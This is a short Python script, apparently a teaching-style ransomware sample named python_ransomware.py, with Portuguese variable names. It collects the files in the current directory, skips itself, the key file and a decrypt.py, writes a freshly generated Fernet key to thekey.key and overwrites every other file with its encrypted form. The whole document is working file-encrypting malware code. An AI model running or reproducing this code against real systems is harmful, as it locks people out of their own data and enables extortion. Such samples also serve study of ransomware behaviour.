#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet

arquivos = []

for arquivo in os.listdir():

    if arquivo == "python_ransomware.py" or arquivo == "thekey.key" or arquivo == "decrypt.py":
        continue
    if os.path.isfile(arquivo):

        arquivos.append(arquivo)


print(arquivos)


chave = Fernet.generate_key()

with open("thekey.key", "wb") as thekey:
    thekey.write(chave)

for arquivo in arquivos:
    with open(arquivo, "rb") as theFile:
        conteudo = theFile.read()

    conteudo_encriptografado = Fernet(chave).encrypt(conteudo)
    with open(arquivo, "wb") as theFile:
        theFile.write(conteudo_encriptografado)
